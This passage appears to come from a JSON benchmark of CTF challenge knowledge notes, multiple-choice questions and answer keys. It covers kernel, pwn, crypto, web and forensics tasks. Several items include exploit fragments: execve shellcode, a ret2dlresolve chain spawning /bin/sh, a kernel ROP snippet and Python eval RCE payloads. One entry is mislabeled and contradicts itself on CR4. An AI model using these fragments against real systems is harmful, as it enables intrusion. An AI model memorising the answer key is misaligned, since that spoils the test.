            "In an eBPF challenge involving a vulnerability that allows arbitrary kernel memory read through backward jumps, consider a setup where you must exploit incorrect handling of jump instruction offsets. Given that forward jumps are correctly handled if crossing a boundary (`pos`) before the jump instruction, which statement correctly summarizes the approach for exploiting backward jumps leveraging similar boundary-crossing logic?  - A. Forward jumps can be coaxed into behaving like backward jumps by manipulating the destination address to point before `pos`. - B. The exploit relies on creating unreachable code via backward jumps, ensuring execution flow leads to a security compromise. - C. To exploit backward jumps, one must ensure the jump destination is before newly patched instructions, taking advantage of incorrect offset adjustments. - D. By forcing a backward jump to directly target the `pos` itself, thereby circumventing any boundary checks and exploiting the flawed logic. ",
            "In exploiting the ALU sanitation patches in eBPF for arbitrary memory access, considering an operation where `BPF_REG_0` is a pointer and `BPF_REG_7` a scalar value, leading to an instruction expansion. How can this behavior be exploited to manipulate pointer arithmetic and achieve arbitrary memory access?  - A. By ensuring that `BPF_REG_7` contains a negative value, causing underflow in pointer calculations and redirecting execution flow to controlled memory. - B. Exploiting the expanded instructions by controlling `BPF_REG_7` to point to a controlled buffer, thereby bypassing bounds checks. - C. Leveraging the instruction expansion to insert arbitrary code in the places of added checks, altering the execution flow of the eBPF program. - D. Manipulating the scalar value in `BPF_REG_7` to access out-of-bounds memory by calculating the correct `alu_limit` and thus controlling the pointer arithmetic. "
        ],
        "answer": [
            "C. To exploit backward jumps, one must ensure the jump destination is before newly patched instructions, taking advantage of incorrect offset adjustments.",
            "D. Manipulating the scalar value in `BPF_REG_7` to access out-of-bounds memory by calculating the correct `alu_limit` and thus controlling the pointer arithmetic."
        ]
    },
    {
        "name": "Braincool",
        "write_up": "dataset/raw/Braincool.md",
        "type": "web",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "In challenges related to secure hardware (like Ledger Nano) and cryptographic protocols, reverse engineering skills combined with understanding APDU communication can be critical for exploitation or forging cryptographic material. Emulators such as Speculos can be extremely beneficial for debugging and understanding the behavior of secure hardware devices. This knowledge applies when attempting to interact with or replicate the security mechanisms of hardware wallets or smart cards in a controlled environment.",
            "In scenarios involving elliptic curve cryptography (ECC) and particularly ECDSA, you can forge valid signatures by exploiting the verification function without needing to know the private key. This approach is applicable when the verification process does not strictly validate the hash of the message, thus allowing an attacker to generate a valid `(r, s)` pair for the verification process by cleverly choosing values for `u1` and `u2` and calculating the respective elliptic curve points. This method requires mathematical manipulation and an understanding of the ECC and the ECDSA verification process.\n   ```python\n   # Given values u1, u2, Q (public key), and curve parameters\n   u1 = 0\n   u2 = 1\n   R = Q\n   while True:\n       u1 += 1\n       R += G  # G is the base point on the elliptic curve\n       r = R[0].lift() % q  # q is the curve order\n       s = r\n       h = u1 * s % q\n       if hex(h).startswith('0x435446'):  # 'CTF' in hex\n           print(r, s, h, u1, u2)\n           break\n   ```\nThis strategy allows for the generation of a payload that will pass ECDSA verification checks in the absence of stringent message hash validations, which can be used directly in CTF challenges that simulate or involve similar cryptographic scenarios."
        ],
        "question": [
            "In a scenario where an attacker is aiming to interact with a secure hardware device using APDU commands, which tool would be the most beneficial for debugging and understanding the behavior of this device?  - A. Wireshark, for capturing and analyzing network traffic between the device and its host. - B. GDB, for dynamic analysis of the firmware running on the device. - C. Speculos, an emulator for secure hardware devices such as Ledger Nano, useful for debugging and APDU command testing. - D. Fiddler, for debugging and proxying HTTP traffic between the device and its services. ",
            "When attempting to forge an ECDSA signature without the private key, given elliptic curve parameters and a public key Q, which of the following describes a valid approach to generate a payload that could bypass ECDSA verification in certain scenarios?  - A. Select random values for `r` and `s`, calculate `u1 = r * s % q`, and use the result as `h` in the payload. - B. Increment `u1` starting from 0, set `u2 = 1`, and perform elliptic additions to find an `r` value where the hexadecimal representation of `h = u1 * s % q` matches a specific pattern. - C. Solve for `u1` and `u2` directly using the public key Q and a chosen value for `h`, then calculate `r` and `s` directly from `u1` and `u2`. - D. Use a brute force attack to find `u1` and `u2` such that `r` equals the x-coordinate of the public key Q and `s` is the hash of the message. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "BrainSim",
        "write_up": "dataset/raw/BrainSim.md",
        "type": "pwn",
        "competition": [
            "COMPFEST/2021",
            "https://ctftime.org/event/1358/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "Leveraging a Brainfuck interpreter's unchecked data pointer (`mp`) movements, an attacker can manipulate the stack to leak memory addresses or overwrite return addresses. This approach is viable when the Brainfuck interpreter processes user-defined programs without proper validation. By using specific patterns like `.,[>.,]` for memory address leaks and `,[>,]` for overwriting data on the stack, one can perform arbitrary memory operations.\n   - Example payload to leak stack addresses: `.,[>.,]`\n   - Example payload to overwrite data on the stack: `,[>,]`",
            "In scenarios where Non-Executable (NX) stack protection is disabled (`NX disabled`), and a program allows the execution of user-defined input without sufficient sanitization, it's possible to execute shellcode placed on the stack. Crafting and sending a payload that contains shellcode to overwrite the return address can grant an attacker control over the execution flow of a vulnerable program. This method requires prior knowledge or leaking of a stack address where the shellcode is placed.\n   - Example shellcode: `'\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x8d\\x42\\x3b\\x0f\\x05'`"
        ],
        "question": [
            "In a CTF challenge, how does utilizing the Brainfuck interpreter's unchecked data pointer (`mp`) movements enable an attacker to leak memory addresses from the stack?  Consider this payload example for leaking stack addresses: `.,[>.,]`. This specific pattern demonstrates the scenario. What does this payload accomplish in the context of exploiting the Brainfuck interpreter's unchecked `mp` movements?  - A. It increments the instruction pointer indefinitely. - B. It sends all user input directly to the interpreter's output. - C. It reads and outputs data from consecutive stack addresses, thereby leaking them. - D. It overwrites the stack with user-controlled input. ",
            "When Non-Executable (NX) stack protection is disabled (`NX disabled`), and the program processes user-supplied input without adequate validation, executing shellcode placed on the stack becomes feasible. Given this context, what is a prerequisite for an attacker aiming to leverage this vulnerability to control the program's execution flow?  Consider this example shellcode: `'\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x8d\\x42\\x3b\\x0f\\x05'`  - A. Finding and exploiting a format string vulnerability to leak memory addresses. - B. Leaking a program's stack address to accurately place the shellcode in memory. - C. Disabling Address Space Layout Randomization (ASLR) on the target system. - D. Forcing the program to execute in a Virtual Machine (VM) with custom security settings. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Breath of Shadow",
        "write_up": "dataset/raw/Breath of Shadow.md",
        "type": "crypto",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a driver vulnerability challenge that involves manipulating device IOCTL (Input Output Control) requests, analyze the driver's handling function (`IrpMjDeviceControl`) to identify control codes and possible vulnerabilities such as out-of-bounds (OOB) read/write errors. This knowledge applies to challenges where the exploit must interact with a Windows kernel driver via IOCTL requests. In such scenarios, carefully crafted IOCTL requests can be used to manipulate kernel memory and achieve arbitrary code execution. An example strategy involves determining the correct IOCTL command to interact with the device, then leveraging OOB errors to read or modify kernel memory.",
            "Constructing a ROP (Return-Oriented Programming) chain in a Windows kernel exploit scenario requires precise argument layout and stack alignment. Important tips include: ensuring arguments are placed below the stack pointer to avoid corruption by interrupt handlers, aligning the stack to 16 bytes before calling functions to accommodate instructions like `MOVDQA`, and utilizing existing system calls like `ZwOpenFile` or `ZwReadFile` for performing operations with only kernel privileges (avoiding direct modification of sensitive registers like CR4 to evade PatchGuard protection). These principles are crucial in scenarios where the exploit needs to execute a series of kernel-level operations without causing a crash due to misaligned or corrupted stack data.\n\nExample ROP snippet (given as conceptual guidance rather than direct payload):\n```\nBuf[pos++] = (KernelBase + 0x14001FC39 - 0x140001000);  /* pop rcx ; ret */\nBuf[pos++] = 0x406f8;                                   /* cr4 value */\nBuf[pos++] = (KernelBase + 0x14017ae47 - 0x140001000);  /* mov cr4, rcx ; ret */\n```"
        ],
        "question": [
            "When analyzing a Windows kernel driver's `IrpMjDeviceControl` function, which of the following actions could potentially lead to a security breach? - A. Checking the IOCTL control code against a whitelisted set before proceeding with request handling. - B. Ensuring all memory accesses within the function are bounds-checked to prevent out-of-bounds read/write vulnerabilities. - C. Using hard-coded control codes for device operations without proper authentication or validation. - D. Carefully validating the size and the existence of the `Type3InputBuffer` before performing operations on it. ",
            "In a Windows kernel exploit where a Return-Oriented Programming (ROP) chain is necessary, what alignment is crucial before calling functions to ensure stability and avoid crashes? - A. Aligning the stack to 8 bytes. - B. Placing arguments directly above the stack pointer. - C. Aligning the stack to 16 bytes. - D. Using unaligned memory addresses for function arguments. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "brie man",
        "write_up": "dataset/raw/brie man.md",
        "type": "misc",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 208,
        "max_score": 1000,
        "difficulty": 0.208,
        "knowledge": [
            "When dealing with Python-based challenges, particularly those involving the evaluation of expressions or parsing of inputs, the use of `eval()` presents a potential Remote Code Execution (RCE) vulnerability. One can execute arbitrary code if they can control the input to `eval()`. This principle applies especially in scenarios where the input is poorly validated or sanitized. To exploit such a vulnerability, one can inject Python code as part of the input, which gets executed by the `eval()` function. \n   - Example payload: `print(open('flag.txt').read())` in an input that leads to an `eval()` call.",
            "In challenges involving complex numerical or mathematical computations, especially when using libraries or frameworks such as SageMath (`sage`), inspecting the source code or implementation of functions used in the challenge can reveal vulnerabilities. These vulnerabilities might stem from insecure or naive implementations, such as using `eval()` to parse strings into numbers or expressions. This knowledge serves as a reminder to scrutinize the underlying implementations of libraries or functions for potential injection points or execution paths that are not immediately apparent.\n   - Example approach: Inspecting `_element_constructor_()` or similar functions for usage of `eval()` with user-controlled input, leading to possible RCE."
        ],
        "question": [
            "In a Python challenge, consider the following scenario where the program uses an `eval()` function to dynamically evaluate expressions based on user input: ```python return eval(source, sage.all.__dict__, locals) ``` If an attacker aims to exploit this to achieve Remote Code Execution (RCE), which of the following payloads would likely lead to an RCE when submitted as part of the input? - A. `'print('Hello World')'` - B. `2+2` - C. `print(open('flag.txt').read())` - D. `__import__('os').system('ls')` ",
            "During a CTF challenge involving numerical calculations with SageMath, an examination of the `_element_constructor_()` function reveals the use of `eval()` to convert a string to a numerical value, as shown in the excerpt: ```python sage_eval(x.replace(' ',''), locals={\"I\":self.gen(),\"i\":self.gen()}) ``` Given this information, which security best practice is being violated due to the implementation of this function? - A. Proper input validation and sanitization to avoid SQL injection. - B. Avoidance of using `eval()` with inputs that are not strictly controlled or sanitized to prevent Remote Code Execution. - C. Secure configuration of network services to avoid buffer overflows. - D. Implementation of strong, cryptographic algorithms for hashing passwords. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Brittle Little Secret",
        "write_up": "dataset/raw/Brittle Little Secret.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with an elliptic curve cryptography (ECC) challenge in CTFs, especially involving secure subgroups and commitments, if you suspect the points do not belong to the expected subgroups, factor the order of these points. This can reveal vulnerabilities due to smaller, unexpected subgroup orders allowing for a feasible discrete logarithm problem solution. For instance, multiplying the points by a large prime factor of the order that significantly reduces the order may make discrete logarithm computations tractable.  \n   - Example strategy: Factor the order of a given point `g1.order()` and look for prime factors to reduce the group order to a manageable size for discrete logarithm: `factor(g1.order())`.",
            "When the challenge involves finding a secret key using commitments and ECC, and direct discrete logarithm approaches fail due to large group orders, try reducing the order first as mentioned. If this reveals more manageable orders, apply the Chinese Remainder Theorem (CRT) to combine solutions modulo different orders when you have remainders of the secret key modulo these orders. This strategy is particularly useful when you manage to split the order into smaller factors, compute discrete logs for each factor effectively, and then need to recombine the key parts.\n   - Example implementation: Use CRT with the remainders and the orders: `CRT([remainder1, remainder2], [order1, order2]) = combined_key`."
        ],
        "question": [
            "In the context of an ECC challenge, when attempting to solve for a secret key and the given subgroup orders are extremely large, to make the discrete logarithm problem tractable, what initial step should you take if you suspect the group orders include unexpectedly small subgroups? - A. Convert the subgroup points to another elliptic curve. - B. Directly apply the Chinese Remainder Theorem to all points. - C. Factor the order of a relevant point to identify manageable subgroups for the discrete logarithm problem. - D. Increase the subgroup orders by multiplying with a large prime.",
            "If you have computed discrete logarithms modulo different orders in an ECC challenge but need to find a secret key that satisfies both, which of the following techniques is most appropriate for combining these solutions? - A. Applying a hash function to the individual logarithms. - B. Using the Chinese Remainder Theorem (CRT) to combine the remainders of the secret key with respect to the different orders. - C. Multiplying the logarithms together and reducing by the prime order of the elliptic curve. - D. Summing the discrete logarithms and dividing by the number of logarithms computed."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Broken Invitation",
        "write_up": "dataset/raw/Broken Invitation.md",
        "type": "crypto",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When faced with the scenario of a Hastad Broadcast attack in RSA where the same message is encrypted with the same small exponent (e.g., `e=3`) across different moduli, Chinese Remainder Theorem (CRT) can be employed to recover the message. This method requires collecting ciphertexts and their corresponding `N` values (moduli), then applying the CRT to find `message^e mod N`, where `N` is the product of all `N` values. After obtaining this result, the integer cubic root (or the e-th root for different values of `e`) of the result gives the original message.",
            "If the decrypted message does not make sense or appears incorrect, one should consider byte order issues such as little-endian versus big-endian representation. In cases where the output is unexpected, reversing the byte order of the decrypted message might reveal the correct flag. This step is essential when the decryption process uses a non-standard method for converting long integers to bytes, which may differ from the typical byte order assumptions made by widely used libraries or languages. \n\nExample payload:\n```python\nfrom crypto_commons.generic import long_to_bytes\nfrom crypto_commons.rsa.rsa_commons import hastad_broadcast\n\ndef main():\n   # Given NA, NB, NC, c1, c2, c3\n   residue_and_moduli = [(c1, NA), (c2, NB), (c3, NC)]\n   result = hastad_broadcast(residue_and_moduli)\n   flag = long_to_bytes(result)[::-1] # Reverse byte order for the correct flag\n   print(flag)\n\nmain()\n```"
        ],
        "question": [
            "In a scenario involving an RSA encryption with a small exponent \\(e=3\\) and usage of different moduli (Ni), when attempting to recover the same message that was broadcasted, which method is correctly utilized to compute the original message from the given ciphertexts? - A. Applying Fermat's Little Theorem to each ciphertext and summing the results. - B. Using the Extended Euclidean Algorithm to find the multiplicatives inverses of each \\(N_i\\) and then summing them. - C. Employing the Chinese Remainder Theorem (CRT) to combine the ciphertexts and computing the cubic root of the result. - D. Deciphering each ciphertext individually with their respective \\(N_i\\) and averaging the results. ",
            "If a decrypted RSA message appears garbled or incorrect, which action should be considered to potentially reveal the correct message content, keeping in mind that the issue might be related to the method used for converting the long integer decryption result back to bytes? - A. Recalculate each step of the RSA decryption process to ensure no computational errors. - B. Reverse the byte order of the decrypted message after conversion from long to bytes, as the incorrect message might be due to little-endian versus big-endian representation issues. - C. Convert the decrypted message from bytes to a string using UTF-16 encoding instead of UTF-8. - D. Apply a hash function to the decrypted message bytes to check the integrity before conversion. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Broken TV",
        "write_up": "dataset/raw/Broken TV.md",
        "type": "misc",
        "competition": [
            "Defcamp/2018/Quals",
            "https://ctftime.org/event/654/tasks/"
        ],
        "score": 83,
        "max_score": 369,
        "difficulty": 0.22493224932249323,
        "knowledge": [
            "When dealing with data exfiltration challenges, if direct data transfer is not possible, analyzing indirect signals such as the response time of pings to the target server can reveal binary-encoded data. This requires discerning patterns or ranges in the response times that correspond to binary digits (e.g., response times greater than a certain threshold represent a binary '1', and those below another threshold represent a '0'). This method can be especially useful in environments with strict data communication controls.\n   \n    - Example payload for analyzing ping times: \n    ```python\n    import subprocess\n\n    # Replace 'target_ip' with the actual target IP address\n    target_ip = \"104.248.38.191\"\n    ping_command = f\"ping -c 1 {target_ip}\"\n    binary_data = \"\"\n\n    for _ in range(100):  # Adjust number of pings as needed\n        response = subprocess.check_output(ping_command.split())\n        time_ms = float(response.decode().split(\"time=\")[1].split(\" ms\")[0])\n        \n        if time_ms > 1000:\n            binary_data += \"1\"\n        elif 200 < time_ms < 1000:\n            binary_data += \"0\"\n    print(binary_data)\n    ```",
            "After obtaining binary-encoded data from indirect communication methods like ping response times, the binary data often needs to be converted into ASCII to retrieve meaningful information or a flag. This can be done using online tools or scripts to translate binary digits into ASCII characters. This step is crucial for reconstructing the obtained data into a readable format, such as flags in CTF challenges.\n\n    - Example conversion snippet (continuing from the payload above):\n    ```python\n    ascii_characters = [chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8)]\n    flag = \"\".join(ascii_characters)\n    print(flag)\n    ```"
        ],
        "question": [
            "In the context of analyzing indirect signals for data exfiltration, when direct data transfer isn't feasible, one method includes observing the response time of pings to a server to discern binary-encoded data. Given the scenario where response times under 200ms must be ignored, times greater than 200 and under 1000ms represent a binary '0', and times above 1000ms represent a binary '1', which Python code snippet correctly demonstrates how to analyze these ping times to construct binary data? - A. ```python import subprocess target_ip = \"104.248.38.191\" ping_command = f\"ping -c 1 {target_ip}\" binary_data = \"\" for _ in range(100): response = subprocess.check_output(ping_command.split()) time_ms = float(response.decode().split(\"time=\")[1].split(\" ms\")[0]) if time_ms > 200: binary_data += \"0\" elif time_ms > 1000: binary_data += \"1\" print(binary_data) ``` - B. ```python import subprocess target_ip = \"example.com\" ping_command = f\"ping -n 1 {target_ip}\" binary_data = \"\" for _ in range(10): response = subprocess.check_output(ping_command.split()) time_ms = int(response.decode().split(\"time<\")[1].split(\"ms\")[0]) if time_ms > 1000: binary_data += \"1\" elif 200 < time_ms < 1000: binary_data += \"0\" print(binary_data) ``` - C. ```python import subprocess target_ip = \"104.248.38.191\" ping_command = f\"ping -c 1 {target_ip}\" binary_data = \"\" for _ in range(100): response = subprocess.check_output(ping_command.split()) time_ms = float(response.decode().split(\"time=\")[1].split(\" ms\")[0]) if time_ms > 1000: binary_data += \"1\" elif 200 < time_ms < 1000: binary_data += \"0\" print(binary_data) ``` - D. ```python import os target_ip = \"104.248.38.191\" binary_data = \"\" for _ in range(100): response = os.popen(f\"ping -c 1 {target_ip}\").read() time_ms = float(response.split(\"time=\")[1].split(\" ms\")[0]) if time_ms <= 200: continue elif time_ms > 1000: binary_data += '1' print(binary_data) ```",
            "After capturing binary-encoded data through indirect communication methods, such as ping response times, converting this binary data into ASCII is critical for retrieving meaningful information or flags. Which Python code snippet correctly demonstrates converting a string of binary data into its ASCII character representation, given a scenario where the binary data represents encoded message to be decoded? - A. ```python binary_data = \"01001000 01100101 01101100 01101100 01101111\" ascii_characters = [chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 9)] flag = \"\".join(ascii_characters) print(flag) ``` - B. ```python binary_data = \"Your_Binary_String_Here\" binary_groups = binary_data.split(\" \") ascii_characters = [chr(int(b, 2)) for b in binary_groups] flag = \"\".join(ascii_characters) print(flag) ``` - C. ```python binary_data = \"1101111011001101\" ascii_characters = \"\".join([chr(int(binary_data[i*8:i*8+8], 2)) for i in range(len(binary_data)//8)]) print(\"Decoded ASCII message:\", ascii_characters) ``` - D. ```python binary_data = \"Your_Binary_String_Here\" ascii_characters = [chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8)] flag = \"\".join(ascii_characters) print(flag) ```"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "brokenimg 100",
        "write_up": "dataset/raw/brokenimg 100.md",
        "type": "forensics",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering hidden data within image files, it's vital to scrutinize metadata fields (such as `tiff:Artist` in a TIFF image) for any suspicious or out-of-place entries. These entries might contain encoded data in formats like decimal, hexadecimal, or octal, and converting these values could reveal further clues or direct links to additional resources. For instance, converting octal values to ASCII can expose hidden URLs or messages.  \n**Example conversion (octal to ASCII):** `150 164 164 160 163 72 57 57 146 151 154 145 163 56 144 157 170 142 151 156 56 147 147 57 157 63 126 144 162 115 160 164 56 160 156 147` translates to a URL.",
            "If an image appears to contain encoded strings that are partially visible or split across different parts of the image, consider the possibility that the image has been manipulated (e.g., stretched, split, or mirrored). Tools or techniques to revert these manipulations, such as photo editing software, can be instrumental in revealing entire encoded sequences. Once the full encoded string is visible, it may require a sequence of decoding steps through different encoding schemes (e.g., Base32 to Base64) to retrieve the final flag or message.  \n**Decoding process example:** Transform a Base32 encoded string `KZCU4UKN...HU======` to reveal another encoded layer, e.g., `VENQMVB7...voNfQo=`, which then needs to be Base64 decoded to get the plaintext flag `TCP1P{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}`."
        ],
        "question": [
            "In the context of analyzing image files for cybersecurity investigations, it's common to explore metadata for potential clues hidden within. Suppose you encounter a TIFF image containing the following octal number sequence in its `tiff:Artist` metadata field: `150 164 164 160 163 72 57 57 146 151 154 145 163 56 144 157 170 142 151 156 56 147 147 57 157 63 126 144 162 115 160 164 56 160 156 147`. Understanding that each octal number is less than 8, what would be the most appropriate action to reveal potential hidden messages or links? - A. Convert the decimal numbers directly to ASCII characters. - B. Convert the octal numbers to hexadecimal values before decoding. - C. Convert the octal numbers directly to ASCII characters to uncover hidden information. - D. Ignore the numbers as they likely do not contain any useful information.",
            "When analyzing an image for hidden data and discovering partially visible encoded strings that suggest the image has undergone some form of manipulation (e.g., stretching or mirroring), what methodological step should be considered next to uncover the full encoded message? Suppose you are dealing with an image that displays base32 encoded strings in a visually distorted form, indicating parts of the strings are split or obscured due to the image's alteration. - A. Ignore the visual distortion and attempt to brute-force the decryption of the visible part of the encoded string. - B. Use photo editing software to revert the manipulation, revealing the complete encoded strings for further analysis. - C. Focus solely on extracting RGB color values from the image, assuming they hide the encoded message. - D. Immediately perform a binwalk analysis on the image file to search for embedded files instead of addressing the visual manipulation."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "bson",
        "write_up": "dataset/raw/bson.md",
        "type": "misc",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "When encountering binary serialization formats such as MessagePack in CTF challenges, conversion tools can be used to decode the data into a more readable format like JSON. This approach is applicable in scenarios where the challenge provides encoded or serialized data, suggesting that the information is hidden or stored in non-plaintext formats.",
            "If a challenge involves encrypted or obfuscated data where a key is provided alongside numeric data representing ASCII values, applying a XOR operation between the key and each data element can reveal the plaintext. This technique is useful in scenarios where cryptographic operations or data obfuscation is performed using a XOR cipher, and both the key and the obfuscated data are known.\n   \n   Example Python code snippet to apply XOR and reveal ASCII characters:\n   ```python\n   key = 92\n   data = [55, 55, 47, 39, 54, ...]  # truncated for brevity\n   ascii_flag = [chr(key ^ byte) for byte in data]\n   print(''.join(ascii_flag))\n   ```"
        ],
        "question": [
            "In a CTF challenge, when analyzing a JSON file that contains a hexadecimal string labeled as \"message_pack_data\", which approach is appropriate for converting this data to a readable format? - A. Use an online hexadecimal to ASCII converter to directly obtain readable text. - B. Employ a MessagePack to JSON conversion tool to translate the binary serialization format into readable JSON. - C. Manually decode the hexadecimal string by applying Base64 decoding techniques. - D. Perform a direct translation using regular expressions to filter and display characters.",
            "When given a cipher text represented by an array of decimal numbers and a key for decryption, with the hint that decryption involves reversing an obfuscation process applied on ASCII characters, which Python code snippet correctly demonstrates the decryption process using XOR operation? - A. `ascii_flag = ''.join([str(key + c) for c in cipher_text])` - B. `ascii_flag = ''.join([chr(c // key) for c in cipher_text])` - C. `ascii_flag = [chr(key ^ byte) for byte in cipher_text]` - D. `ascii_flag = ''.join([chr(c << key) for c in cipher_text])`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Buggy PWN",
        "write_up": "dataset/raw/Buggy PWN.md",
        "type": "pwn",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 138,
        "max_score": 500,
        "difficulty": 0.276,
        "knowledge": [
            "When exploiting a vulnerable service by overwriting the return address on the stack to redirect execution, ensuring the payload consists of only printable ASCII characters is crucial if the system constraints dictate so. This is especially relevant in challenges where input is limited to printable characters. Consider constructing payloads that adapt to this limitation by using XOR operations to turn non-printable into printable characters. For instance, if the target values are the ASCII codes for 'f' and 'l', and the constraint requires printable characters only, XOR these values with a printable character to produce a result that meets the input constraint. An illustrative payload component might look like this:\n```\nxorchar = '\\x40'  # A printable character chosen for XOR operation\neax_val = chr(ord('f')^ord(xorchar)) + chr(ord('l')^ord(xorchar))\n```",
            "In scenarios involving a custom virtual machine (VM) or unique architecture within a CTF challenge, closely inspecting and understanding the memory operations, including how data is read, written, and how execution flow can be manipulated, is essential. If the VM employs a 2D memory plane and uses specific syscalls or commands to alter execution flow (like a `rotip` command to change execution direction), crafting a precise exploit demands ingenuity in how shellcode is laid out in memory. For such challenges, it's beneficial to devise a strategy that not only injects the required shellcode but also aligns with the VM's execution mechanics to ensure the payload executes as intended. An example approach involves leveraging a command to redirect the execution flow vertically instead of the default horizontal direction, addressing constraints like the maximum string length or specific syscall requirements to trigger a desired action, such as printing a flag."
        ],
        "question": [
            "When constructing an exploit payload for a system that only accepts printable ASCII characters, what approach is viable for dealing with characters that are not printable in your payload? - A. Use base64 encoding to ensure all characters are printable. - B. Encrypt the payload to ensure it only contains printable characters. - C. Use XOR operations to convert non-printable characters into printable ones by XORing with a specific character. - D. Apply URL encoding to the payload to ensure all characters are within the printable ASCII range.",
            "In a Capture the Flag challenge featuring a virtual machine with a unique architecture that implements a 2D memory plane and allows for execution flow manipulation, what technique could be effective for overcoming limitations such as the maximum string length and specific execution path requirements? - A. Injecting a NOP sled into memory to ensure that the execution path leads to the shellcode regardless of the starting point. - B. Utilizing a memory corruption vulnerability to overwrite memory management structures and gain arbitrary code execution. - C. Leveraging a command like `rotip` to change the direction of execution flow, allowing for vertical execution of shellcode laid out in memory, addressing specific architectural constraints. - D. Exploiting a buffer overflow to inject a large shellcode payload directly into the stack, bypassing the 2D memory model entirely."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "bunnydance",
        "write_up": "dataset/raw/bunnydance.md",
        "type": "pwn",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "Stack buffer overflow vulnerabilities can be exploited by sending a cyclic pattern payload to overwrite the return pointer address. This process involves generating a unique cyclic pattern, overflowing the buffer to crash the program, and analyzing the core dump to find the exact offset where the return address is overwritten. This technique is useful in scenarios where security mechanisms like stack canaries are not present, allowing direct manipulation of the stack's return pointer.\n\n    Example payload generation and offset finding using Python with Pwntools:\n    ```python\n    payload = pwn.cyclic(128)\n    # Process execution and crash\n    core = pwn.Coredump(\"./core\")\n    offset = pwn.cyclic_find(core.fault_addr & (2 ** 32 - 1))\n    ```",
            "The `ret2dlresolve` technique can be applied to execute arbitrary code by leveraging the dynamic linker and resolver. This technique is particularly useful when direct code execution via traditional methods (like `ret2libc`) is not possible or more challenging due to restrictions or protections. By crafting a payload that causes the dynamic linker to resolve a function (such as \"system\") with controlled arguments, attackers can achieve arbitrary code execution even with limited control over the execution flow or memory content.\n\n    Example of constructing a `ret2dlresolve` payload with Pwntools:\n    ```python\n    ret2dl = pwn.Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"], bss)\n    rop = pwn.ROP(elf)\n    rop.raw(rop.ret.address)  # ret gadget to align stack\n    rop.gets(bss)\n    rop.ret2dlresolve(ret2dl)\n    payload = b\"A\" * offset + rop.chain() + b\"\\n\" + ret2dl.payload\n    ```"
        ],
        "question": [
            "When exploiting a stack buffer overflow vulnerability without stack canaries, which method is used to determine the offset to the return address? - A. Analyzing the program's source code to manually count the buffer size and additional padding. - B. Sending a unique cyclic pattern to the program, causing it to crash, and then determining the offset using the address where the crash occurred. - C. Utilizing static analysis tools to automatically detect the buffer size and calculate the offset. - D. Intercepting the program's execution with a debugger to visually inspect the stack and calculate the offset manually.",
            "In the context of a `ret2dlresolve` exploit, which of the following best describes the purpose of the technique? - A. It creates a ROP chain to directly call functions like `execve` with controlled parameters to spawn a shell. - B. It leverages the dynamic linker to resolve symbols and execute functions such as `system` with specified arguments, despite restrictions on direct code execution. - C. It overwrites function pointers or GOT entries with the addresses of shellcode placed in the data sections of an executable. - D. It uses a format string vulnerability to write arbitrary values to memory locations, leading to code execution."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Burn the candle on both the ends",
        "write_up": "dataset/raw/Burn the candle on both the ends.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In a forensic challenge involving file analysis, **Binwalk** can be employed to detect and extract embedded files within a given challenge file, such as a ZIP file hidden inside an image. This technique is applicable when the challenge file appears to be a standard file format (e.g., JPG) but may contain additional data or files.  \nExample command:  \n```binwalk -e candle.jpg```",
